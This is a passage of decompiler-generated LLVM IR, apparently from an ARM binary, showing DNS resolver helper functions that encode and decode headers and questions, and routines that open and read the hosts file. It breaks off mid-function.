  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_19cb8 = load i32, i32* @lr, align 4
  store i32 %v0_19cb8, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_19cc4 = icmp sgt i32 %arg3, 11
  br i1 %v7_19cc4, label %dec_label_pc_19ccc, label %dec_label_pc_19d98

dec_label_pc_19ccc:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_19ccc = add i32 %tmp, 1
  %v2_19ccc = inttoptr i32 %v1_19ccc to i8*
  %v3_19ccc = load i8, i8* %v2_19ccc, align 1
  store i8 %v3_19ccc, i8* %tmp16, align 1
  %v0_19cd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19cd4 = inttoptr i32 %v0_19cd4 to i32*
  %v2_19cd4 = load i32, i32* %v1_19cd4, align 4
  %v1_19cd8 = trunc i32 %v2_19cd4 to i8
  %v4_19cd8 = add i32 %arg2, 1
  %v5_19cd8 = inttoptr i32 %v4_19cd8 to i8*
  store i8 %v1_19cd8, i8* %v5_19cd8, align 1
  %v0_19cdc = load i32, i32* %ip.global-to-local, align 4
  %v1_19cdc = add i32 %v0_19cdc, 8
  %v2_19cdc = inttoptr i32 %v1_19cdc to i32*
  %v3_19cdc = load i32, i32* %v2_19cdc, align 4
  %v1_19ce0 = add i32 %v0_19cdc, 20
  %v2_19ce0 = inttoptr i32 %v1_19ce0 to i32*
  %v3_19ce0 = load i32, i32* %v2_19ce0, align 4
  %v1_19ce4 = add i32 %v0_19cdc, 4
  %v2_19ce4 = inttoptr i32 %v1_19ce4 to i32*
  %v3_19ce4 = load i32, i32* %v2_19ce4, align 4
  %v1_19ce8 = add i32 %v0_19cdc, 12
  %v2_19ce8 = inttoptr i32 %v1_19ce8 to i32*
  %v3_19ce8 = load i32, i32* %v2_19ce8, align 4
  %v2_19cec = icmp eq i32 %v3_19ce0, 0
  br i1 %v2_19cec, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19ccc
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19ccc, %bb
  %v0_19cfc = phi i32 [ 0, %dec_label_pc_19ccc ], [ 1, %bb ]
  %v1_19cf4 = urem i32 %v3_19cdc, 16
  %v2_19cf8 = icmp eq i32 %v3_19ce4, 0
  %v4_19cfc = mul nuw nsw i32 %v1_19cf4, 8
  %v5_19cfc = or i32 %v0_19cfc, %v4_19cfc
  %v1_19d00 = add i32 %v0_19cdc, 16
  %v2_19d00 = inttoptr i32 %v1_19d00 to i32*
  %v3_19d00 = load i32, i32* %v2_19d00, align 4
  %. = select i1 %v2_19cf8, i32 0, i32 128
  %v2_19d0c = icmp eq i32 %v3_19ce8, 0
  %storemerge11 = select i1 %v2_19d0c, i32 0, i32 4
  %v2_19d18 = or i32 %v5_19cfc, %.
  %v2_19d1c = icmp eq i32 %v3_19d00, 0
  %.26 = select i1 %v2_19d1c, i32 0, i32 2
  %v2_19d28 = or i32 %v2_19d18, %storemerge11
  %v2_19d2c = or i32 %v2_19d28, %.26
  %v1_19d30 = trunc i32 %v2_19d2c to i8
  %v2_19d30 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d30 = add i32 %v2_19d30, 2
  %v4_19d30 = inttoptr i32 %v3_19d30 to i8*
  store i8 %v1_19d30, i8* %v4_19d30, align 1
  %v0_19d34 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d34 = add i32 %v0_19d34, 24
  %v1_19d38 = inttoptr i32 %v1_19d34 to i32*
  %v2_19d38 = load i32, i32* %v1_19d38, align 4
  %v3_19d38 = add i32 %v0_19d34, 28
  %v4_19d38 = inttoptr i32 %v3_19d38 to i32*
  %v5_19d38 = load i32, i32* %v4_19d38, align 4
  %v2_19d3c = icmp eq i32 %v2_19d38, 0
  %v1_19d40 = urem i32 %v5_19d38, 16
  %v0_19d4c = select i1 %v2_19d3c, i32 0, i32 128
  %v2_19d4c = or i32 %v1_19d40, %v0_19d4c
  %v1_19d50 = trunc i32 %v2_19d4c to i8
  %v2_19d50 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d50 = add i32 %v2_19d50, 3
  %v4_19d50 = inttoptr i32 %v3_19d50 to i8*
  store i8 %v1_19d50, i8* %v4_19d50, align 1
  %v0_19d54 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d54 = add i32 %v0_19d54, 33
  %v2_19d54 = inttoptr i32 %v1_19d54 to i8*
  %v3_19d54 = load i8, i8* %v2_19d54, align 1
  %v2_19d58 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d58 = add i32 %v2_19d58, 4
  %v4_19d58 = inttoptr i32 %v3_19d58 to i8*
  store i8 %v3_19d54, i8* %v4_19d58, align 1
  %v0_19d5c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d5c = add i32 %v0_19d5c, 32
  %v2_19d5c = inttoptr i32 %v1_19d5c to i32*
  %v3_19d5c = load i32, i32* %v2_19d5c, align 4
  %v1_19d60 = trunc i32 %v3_19d5c to i8
  %v2_19d60 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d60 = add i32 %v2_19d60, 5
  %v4_19d60 = inttoptr i32 %v3_19d60 to i8*
  store i8 %v1_19d60, i8* %v4_19d60, align 1
  %v0_19d64 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d64 = add i32 %v0_19d64, 37
  %v2_19d64 = inttoptr i32 %v1_19d64 to i8*
  %v3_19d64 = load i8, i8* %v2_19d64, align 1
  %v2_19d68 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d68 = add i32 %v2_19d68, 6
  %v4_19d68 = inttoptr i32 %v3_19d68 to i8*
  store i8 %v3_19d64, i8* %v4_19d68, align 1
  %v0_19d6c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d6c = add i32 %v0_19d6c, 36
  %v2_19d6c = inttoptr i32 %v1_19d6c to i32*
  %v3_19d6c = load i32, i32* %v2_19d6c, align 4
  %v1_19d70 = trunc i32 %v3_19d6c to i8
  %v2_19d70 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d70 = add i32 %v2_19d70, 7
  %v4_19d70 = inttoptr i32 %v3_19d70 to i8*
  store i8 %v1_19d70, i8* %v4_19d70, align 1
  %v0_19d74 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d74 = add i32 %v0_19d74, 41
  %v2_19d74 = inttoptr i32 %v1_19d74 to i8*
  %v3_19d74 = load i8, i8* %v2_19d74, align 1
  %v2_19d78 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d78 = add i32 %v2_19d78, 8
  %v4_19d78 = inttoptr i32 %v3_19d78 to i8*
  store i8 %v3_19d74, i8* %v4_19d78, align 1
  %v0_19d7c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d7c = add i32 %v0_19d7c, 40
  %v2_19d7c = inttoptr i32 %v1_19d7c to i32*
  %v3_19d7c = load i32, i32* %v2_19d7c, align 4
  %v1_19d80 = trunc i32 %v3_19d7c to i8
  %v2_19d80 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d80 = add i32 %v2_19d80, 9
  %v4_19d80 = inttoptr i32 %v3_19d80 to i8*
  store i8 %v1_19d80, i8* %v4_19d80, align 1
  %v0_19d84 = load i32, i32* %ip.global-to-local, align 4
  %v1_19d84 = add i32 %v0_19d84, 45
  %v2_19d84 = inttoptr i32 %v1_19d84 to i8*
  %v3_19d84 = load i8, i8* %v2_19d84, align 1
  %v2_19d88 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d88 = add i32 %v2_19d88, 10
  %v4_19d88 = inttoptr i32 %v3_19d88 to i8*
  store i8 %v3_19d84, i8* %v4_19d88, align 1
  %v0_19d8c = load i32, i32* %ip.global-to-local, align 4
  %v1_19d8c = add i32 %v0_19d8c, 44
  %v2_19d8c = inttoptr i32 %v1_19d8c to i32*
  %v3_19d8c = load i32, i32* %v2_19d8c, align 4
  %v1_19d90 = trunc i32 %v3_19d8c to i8
  %v2_19d90 = load i32, i32* %lr.global-to-local, align 4
  %v3_19d90 = add i32 %v2_19d90, 11
  %v4_19d90 = inttoptr i32 %v3_19d90 to i8*
  store i8 %v1_19d90, i8* %v4_19d90, align 1
  %v2_19d98.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_19d98

dec_label_pc_19d98:                               ; preds = %entry, %bb17
  %v2_19d98 = phi i32 [ %v2_19d98.pre, %bb17 ], [ %v0_19cb8, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_19d98, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_19cdc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 4, 1 }
  uselistorder i32 37, { 2, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19d98, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_19da0 = load i8, i8* %arg1, align 1
  %v4_19da0 = zext i8 %v3_19da0 to i32
  %v2_19da4 = add i32 %tmp, 1
  %v3_19da4 = inttoptr i32 %v2_19da4 to i8*
  %v4_19da4 = load i8, i8* %v3_19da4, align 1
  %v5_19da4 = zext i8 %v4_19da4 to i32
  %v4_19da8 = mul nuw nsw i32 %v4_19da0, 256
  %v5_19da8 = or i32 %v5_19da4, %v4_19da8
  %v2_19dac = inttoptr i32 %arg2 to i32*
  store i32 %v5_19da8, i32* %v2_19dac, align 4
  %v2_19db0 = add i32 %tmp, 2
  %v3_19db0 = inttoptr i32 %v2_19db0 to i8*
  %v4_19db0 = load i8, i8* %v3_19db0, align 1
  %tmp3 = icmp slt i8 %v4_19db0, 0
  %v3_19db4 = zext i1 %tmp3 to i32
  %v2_19db8 = add i32 %arg2, 4
  %v3_19db8 = inttoptr i32 %v2_19db8 to i32*
  store i32 %v3_19db4, i32* %v3_19db8, align 4
  %v4_19dbc = load i8, i8* %v3_19db0, align 1
  %div = udiv i8 %v4_19dbc, 8
  %tmp4 = urem i8 %div, 16
  %v1_19dc4 = zext i8 %tmp4 to i32
  %v2_19dc8 = add i32 %arg2, 8
  %v3_19dc8 = inttoptr i32 %v2_19dc8 to i32*
  store i32 %v1_19dc4, i32* %v3_19dc8, align 4
  %v4_19dcc = load i8, i8* %v3_19db0, align 1
  %div1 = udiv i8 %v4_19dcc, 4
  %tmp5 = urem i8 %div1, 2
  %v1_19dd4 = zext i8 %tmp5 to i32
  %v2_19dd8 = add i32 %arg2, 12
  %v3_19dd8 = inttoptr i32 %v2_19dd8 to i32*
  store i32 %v1_19dd4, i32* %v3_19dd8, align 4
  %v4_19ddc = load i8, i8* %v3_19db0, align 1
  %div2 = udiv i8 %v4_19ddc, 2
  %tmp6 = urem i8 %div2, 2
  %v1_19de4 = zext i8 %tmp6 to i32
  %v2_19de8 = add i32 %arg2, 16
  %v3_19de8 = inttoptr i32 %v2_19de8 to i32*
  store i32 %v1_19de4, i32* %v3_19de8, align 4
  %v4_19dec = load i8, i8* %v3_19db0, align 1
  %tmp7 = urem i8 %v4_19dec, 2
  %v1_19df0 = zext i8 %tmp7 to i32
  %v2_19df4 = add i32 %arg2, 20
  %v3_19df4 = inttoptr i32 %v2_19df4 to i32*
  store i32 %v1_19df0, i32* %v3_19df4, align 4
  %v2_19df8 = add i32 %tmp, 3
  %v3_19df8 = inttoptr i32 %v2_19df8 to i8*
  %v4_19df8 = load i8, i8* %v3_19df8, align 1
  %tmp8 = icmp slt i8 %v4_19df8, 0
  %v3_19dfc = zext i1 %tmp8 to i32
  %v2_19e00 = add i32 %arg2, 24
  %v3_19e00 = inttoptr i32 %v2_19e00 to i32*
  store i32 %v3_19dfc, i32* %v3_19e00, align 4
  %v4_19e04 = load i8, i8* %v3_19df8, align 1
  %tmp9 = urem i8 %v4_19e04, 16
  %v1_19e08 = zext i8 %tmp9 to i32
  %v2_19e0c = add i32 %arg2, 28
  %v3_19e0c = inttoptr i32 %v2_19e0c to i32*
  store i32 %v1_19e08, i32* %v3_19e0c, align 4
  %v2_19e10 = add i32 %tmp, 4
  %v3_19e10 = inttoptr i32 %v2_19e10 to i8*
  %v4_19e10 = load i8, i8* %v3_19e10, align 1
  %v5_19e10 = zext i8 %v4_19e10 to i32
  %v2_19e14 = add i32 %tmp, 5
  %v3_19e14 = inttoptr i32 %v2_19e14 to i8*
  %v4_19e14 = load i8, i8* %v3_19e14, align 1
  %v5_19e14 = zext i8 %v4_19e14 to i32
  %v4_19e18 = mul nuw nsw i32 %v5_19e10, 256
  %v5_19e18 = or i32 %v5_19e14, %v4_19e18
  %v2_19e1c = add i32 %arg2, 32
  %v3_19e1c = inttoptr i32 %v2_19e1c to i32*
  store i32 %v5_19e18, i32* %v3_19e1c, align 4
  %v2_19e20 = add i32 %tmp, 6
  %v3_19e20 = inttoptr i32 %v2_19e20 to i8*
  %v4_19e20 = load i8, i8* %v3_19e20, align 1
  %v5_19e20 = zext i8 %v4_19e20 to i32
  %v2_19e24 = add i32 %tmp, 7
  %v3_19e24 = inttoptr i32 %v2_19e24 to i8*
  %v4_19e24 = load i8, i8* %v3_19e24, align 1
  %v5_19e24 = zext i8 %v4_19e24 to i32
  %v4_19e28 = mul nuw nsw i32 %v5_19e20, 256
  %v5_19e28 = or i32 %v5_19e24, %v4_19e28
  %v2_19e2c = add i32 %arg2, 36
  %v3_19e2c = inttoptr i32 %v2_19e2c to i32*
  store i32 %v5_19e28, i32* %v3_19e2c, align 4
  %v2_19e30 = add i32 %tmp, 8
  %v3_19e30 = inttoptr i32 %v2_19e30 to i8*
  %v4_19e30 = load i8, i8* %v3_19e30, align 1
  %v5_19e30 = zext i8 %v4_19e30 to i32
  %v2_19e34 = add i32 %tmp, 9
  %v3_19e34 = inttoptr i32 %v2_19e34 to i8*
  %v4_19e34 = load i8, i8* %v3_19e34, align 1
  %v5_19e34 = zext i8 %v4_19e34 to i32
  %v4_19e38 = mul nuw nsw i32 %v5_19e30, 256
  %v5_19e38 = or i32 %v5_19e34, %v4_19e38
  %v2_19e3c = add i32 %arg2, 40
  %v3_19e3c = inttoptr i32 %v2_19e3c to i32*
  store i32 %v5_19e38, i32* %v3_19e3c, align 4
  %v2_19e40 = add i32 %tmp, 11
  %v3_19e40 = inttoptr i32 %v2_19e40 to i8*
  %v4_19e40 = load i8, i8* %v3_19e40, align 1
  %v5_19e40 = zext i8 %v4_19e40 to i32
  %v2_19e44 = add i32 %tmp, 10
  %v3_19e44 = inttoptr i32 %v2_19e44 to i8*
  %v4_19e44 = load i8, i8* %v3_19e44, align 1
  %v5_19e44 = zext i8 %v4_19e44 to i32
  %v4_19e48 = mul nuw nsw i32 %v5_19e44, 256
  %v5_19e48 = or i32 %v4_19e48, %v5_19e40
  %v2_19e4c = add i32 %arg2, 44
  %v3_19e4c = inttoptr i32 %v2_19e4c to i32*
  store i32 %v5_19e48, i32* %v3_19e4c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 12, 13, 10, 11, 2, 14, 9, 37, 1, 3, 21, 22, 23, 24, 25, 26, 18, 19, 20, 15, 16, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 4, 17, 5, 6, 7, 8 }
  uselistorder i32 11, { 19, 20, 7, 8, 9, 10, 11, 21, 22, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 3, 2, 1 }
  uselistorder i32 40, { 12, 13, 16, 1, 6, 14, 17, 2, 15, 4, 3, 0, 7, 8, 9, 10, 11, 5 }
  uselistorder i32 36, { 28, 29, 32, 33, 34, 35, 9, 5, 8, 30, 10, 24, 11, 25, 12, 2, 6, 31, 13, 14, 15, 16, 0, 3, 17, 18, 4, 19, 20, 26, 27, 21, 22, 7, 1, 23 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 23, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10 }
  uselistorder i32 28, { 49, 6, 8, 52, 7, 55, 56, 61, 63, 64, 9, 10, 62, 11, 12, 57, 37, 50, 51, 30, 13, 31, 14, 66, 48, 65, 15, 1, 38, 16, 17, 18, 3, 19, 53, 54, 2, 58, 59, 39, 40, 41, 42, 43, 44, 45, 0, 46, 32, 60, 33, 34, 35, 4, 5, 36, 28, 24, 23, 21, 22, 29, 25, 26, 47, 20, 27 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 16, { 2, 3, 0, 4, 1, 5 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19e54 = load i32, i32* @r4, align 4
  store i32 %v3_19e54, i32* %stack_var_-16, align 4
  %v9_19e54 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_19e5c = load i32, i32* %arg1, align 4
  store i32 %v2_19e5c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_19e68 = inttoptr i32 %v2_19e5c to i8*
  %v2_19e68 = call i32 @__encode_dotted(i8* %v1_19e68)
  store i32 %v2_19e68, i32* %r0.global-to-local, align 4
  %v1_19e6c = icmp slt i32 %v2_19e68, 0
  br i1 %v1_19e6c, label %dec_label_pc_19eac, label %dec_label_pc_19e74

dec_label_pc_19e74:                               ; preds = %entry
  %v1_19e74 = load i32, i32* @r5, align 4
  %v2_19e74 = sub i32 %v1_19e74, %v2_19e68
  %v7_19e7c = icmp slt i32 %v2_19e74, 4
  br i1 %v7_19e7c, label %bb, label %dec_label_pc_19e84

bb:                                               ; preds = %dec_label_pc_19e74
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19eac

dec_label_pc_19e84:                               ; preds = %dec_label_pc_19e74
  %v0_19e84 = load i32, i32* @r4, align 4
  %v1_19e84 = add i32 %v0_19e84, 5
  %v2_19e84 = inttoptr i32 %v1_19e84 to i8*
  %v3_19e84 = load i8, i8* %v2_19e84, align 1
  %v2_19e88 = load i32, i32* @r6, align 4
  %v4_19e88 = add i32 %v2_19e88, %v2_19e68
  %v5_19e88 = inttoptr i32 %v4_19e88 to i8*
  store i8 %v3_19e84, i8* %v5_19e88, align 1
  %v0_19e8c = load i32, i32* @r4, align 4
  %v1_19e8c = add i32 %v0_19e8c, 4
  %v2_19e8c = inttoptr i32 %v1_19e8c to i32*
  %v3_19e8c = load i32, i32* %v2_19e8c, align 4
  %v0_19e90 = load i32, i32* @r6, align 4
  %v1_19e90 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e90 = add i32 %v1_19e90, %v0_19e90
  store i32 %v2_19e90, i32* %r2.global-to-local, align 4
  %v1_19e94 = trunc i32 %v3_19e8c to i8
  %v3_19e94 = add i32 %v2_19e90, 1
  %v4_19e94 = inttoptr i32 %v3_19e94 to i8*
  store i8 %v1_19e94, i8* %v4_19e94, align 1
  %v0_19e98 = load i32, i32* @r4, align 4
  %v1_19e98 = add i32 %v0_19e98, 9
  %v2_19e98 = inttoptr i32 %v1_19e98 to i8*
  %v3_19e98 = load i8, i8* %v2_19e98, align 1
  %v2_19e9c = load i32, i32* %r2.global-to-local, align 4
  %v3_19e9c = add i32 %v2_19e9c, 2
  %v4_19e9c = inttoptr i32 %v3_19e9c to i8*
  store i8 %v3_19e98, i8* %v4_19e9c, align 1
  %v0_19ea0 = load i32, i32* @r4, align 4
  %v1_19ea0 = add i32 %v0_19ea0, 8
  %v2_19ea0 = inttoptr i32 %v1_19ea0 to i32*
  %v3_19ea0 = load i32, i32* %v2_19ea0, align 4
  %v1_19ea4 = trunc i32 %v3_19ea0 to i8
  %v2_19ea4 = load i32, i32* %r2.global-to-local, align 4
  %v3_19ea4 = add i32 %v2_19ea4, 3
  %v4_19ea4 = inttoptr i32 %v3_19ea4 to i8*
  store i8 %v1_19ea4, i8* %v4_19ea4, align 1
  %v0_19ea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_19ea8 = add i32 %v0_19ea8, 4
  store i32 %v1_19ea8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19eac

dec_label_pc_19eac:                               ; preds = %bb, %entry, %dec_label_pc_19e84
  %v1_19eb0 = phi i32 [ -1, %bb ], [ %v2_19e68, %entry ], [ %v1_19ea8, %dec_label_pc_19e84 ]
  %v2_19eac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19eac, i32* @r4, align 4
  store i32 %v9_19e54, i32* @r6, align 4
  ret i32 %v1_19eb0

; uselistorder directives
  uselistorder i32 %v2_19e68, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 21, 22, 23, 26, 27, 4, 25, 20, 5, 14, 0, 15, 30, 6, 7, 13, 24, 11, 12, 16, 17, 18, 19, 8, 9, 10, 3, 2, 1, 28, 29 }
  uselistorder i32 5, { 22, 23, 24, 7, 16, 8, 25, 9, 2, 17, 10, 18, 12, 11, 3, 0, 26, 5, 19, 6, 1, 20, 21, 13, 15, 14, 4 }
  uselistorder label %dec_label_pc_19eac, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32840), i32* @r0, align 4
  %v1_19ecc = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32840))
  ret i32 %v1_19ecc

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_19ee4 = load i32, i32* @r4, align 4
  %v6_19ee4 = load i32, i32* @r5, align 4
  %v9_19ee4 = load i32, i32* @r6, align 4
  %v12_19ee4 = load i32, i32* @r7, align 4
  %v15_19ee4 = load i32, i32* @r8, align 4
  %v18_19ee4 = load i32, i32* @sb, align 4
  %v21_19ee4 = load i32, i32* @sl, align 4
  %v24_19ee4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  %v2_19f0c = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_19f0c, align 4
  %v0_19f10 = load i32, i32* @r0, align 4
  store i32 %v0_19f10, i32* @r6, align 4
  %v0_19f14 = load i32, i32* @r1, align 4
  %v0_19f18 = load i32, i32* @r2, align 4
  store i32 %v0_19f18, i32* @r8, align 4
  %v0_19f1c = load i32, i32* @r3, align 4
  store i32 %v0_19f1c, i32* @fp, align 4
  %v3_19f20 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19f20, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_19f2c

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1a0cc

dec_label_pc_19f2c:                               ; preds = %entry
  %v2_19f2c = icmp eq i32 %v0_19f10, 0
  br i1 %v2_19f2c, label %dec_label_pc_19f34, label %dec_label_pc_19f54

dec_label_pc_19f34:                               ; preds = %dec_label_pc_19f2c
  %v0_19f34 = call i32 @__open_etc_hosts()
  store i32 %v0_19f34, i32* @r6, align 4
  %v2_19f38 = icmp eq i32 %v0_19f34, 0
  br i1 %v2_19f38, label %dec_label_pc_19f40, label %dec_label_pc_19f54

dec_label_pc_19f40:                               ; preds = %dec_label_pc_19f34
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_19f44 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_19f44, align 4
  %v0_19f48 = call i32 @__GI___errno_location()
  %v1_19f4c = inttoptr i32 %v0_19f48 to i32*
  %v2_19f4c = load i32, i32* %v1_19f4c, align 4
  store i32 %v2_19f4c, i32* @sb, align 4
  br label %dec_label_pc_1a0cc

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19f34, %dec_label_pc_19f2c
  %v1_19f74 = phi i32 [ %v0_19f34, %dec_label_pc_19f34 ], [ %v0_19f10, %dec_label_pc_19f2c ]
  %v0_19f58 = load i32, i32* @r4, align 4
  %v2_19f58 = add i32 %v0_19f58, -32828
  store i32 %v2_19f58, i32* @r4, align 4
  %v2_19f5c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_19f74 = add i32 %v1_19f74, 8
  %v3_19f74 = inttoptr i32 %v2_19f74 to i32*
  store i32 48, i32* %v3_19f74, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_19f7c = load i32, i32* @r5, align 4
  %v1_19f7c = add i32 %v0_19f7c, -48
  store i32 %v1_19f7c, i32* %r1.global-to-local, align 4
  %v0_19f80 = load i32, i32* %ip.global-to-local, align 4
  %v1_19f80 = add i32 %v0_19f80, 24
  store i32 %v1_19f80, i32* @ip, align 4
  %v0_19f84 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19f84, i32* @sb, align 4
  %v0_19f88 = load i32, i32* @lr, align 4
  %v1_19f88 = add i32 %v0_19f88, 32
  store i32 %v1_19f88, i32* @sl, align 4
  %v1_19f8c = load i32, i32* @r6, align 4
  %v2_19f8c = add i32 %v1_19f8c, 16
  %v3_19f8c = inttoptr i32 %v2_19f8c to i32*
  store i32 %v1_19f7c, i32* %v3_19f8c, align 4
  %v0_19f90 = load i32, i32* @r4, align 4
  %v0_19f94 = load i32, i32* @ip, align 4
  store i32 %v0_19f94, i32* %stack_var_-64, align 4
  %v0_19f98 = load i32, i32* %r2.global-to-local, align 4
  %v1_19f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_19f98 = inttoptr i32 %v1_19f98 to i32*
  store i32 %v0_19f98, i32* %v2_19f98, align 4
  %v0_19f9c = load i32, i32* @lr, align 4
  %v1_19f9c = load i32, i32* @r6, align 4
  %v2_19f9c = add i32 %v1_19f9c, 4
  %v3_19f9c = inttoptr i32 %v2_19f9c to i32*
  store i32 %v0_19f9c, i32* %v3_19f9c, align 4
  %v2_19fcc = inttoptr i32 %v0_19f14 to i8*
  br label %dec_label_pc_1a0a0

dec_label_pc_19fa4:                               ; preds = %dec_label_pc_1a0a0
  %v3_19fa4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19fa4, i32* %r1.global-to-local, align 4
  %v0_19fa8 = load i32, i32* @fp, align 4
  %v7_19fa8 = icmp eq i32 %v0_19fa8, 1
  %v1_19fac = add i32 %v3_19fa4, 4
  store i32 %v1_19fac, i32* @r5, align 4
  %v1_19fb0 = load i32, i32* @r7, align 4
  %v2_19fb0 = add i32 %v1_19fb0, 4
  %v3_19fb0 = inttoptr i32 %v2_19fb0 to i32*
  store i32 %v1_19fac, i32* %v3_19fb0, align 4
  br i1 %v7_19fa8, label %dec_label_pc_1a0cc, label %dec_label_pc_19fb8

dec_label_pc_19fb8:                               ; preds = %dec_label_pc_19fa4
  %v0_19fb8 = load i32, i32* @fp, align 4
  %v7_19fb8 = icmp eq i32 %v0_19fb8, 2
  br i1 %v7_19fb8, label %dec_label_pc_19fc4, label %dec_label_pc_19fe8.preheader

dec_label_pc_19fe8.preheader:                     ; preds = %dec_label_pc_19fb8
  %v1_19fbc = load i32, i32* @r5, align 4
  %v1_19fe825 = inttoptr i32 %v1_19fbc to i32*
  %v2_19fe826 = load i32, i32* %v1_19fe825, align 4
  store i32 %v2_19fe826, i32* %r3.global-to-local, align 4
  store i32 %v2_19fe826, i32* %r1.global-to-local, align 4
  %v2_19fec28 = icmp eq i32 %v2_19fe826, 0
  %v1_19ff429 = add i32 %v1_19fbc, 4
  store i32 %v1_19ff429, i32* @r4, align 4
  br i1 %v2_19fec28, label %dec_label_pc_1a0a0, label %dec_label_pc_19fdc

dec_label_pc_19fc4:                               ; preds = %dec_label_pc_19fb8
  %v0_19fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_19fc4 = inttoptr i32 %v0_19fc4 to i32*
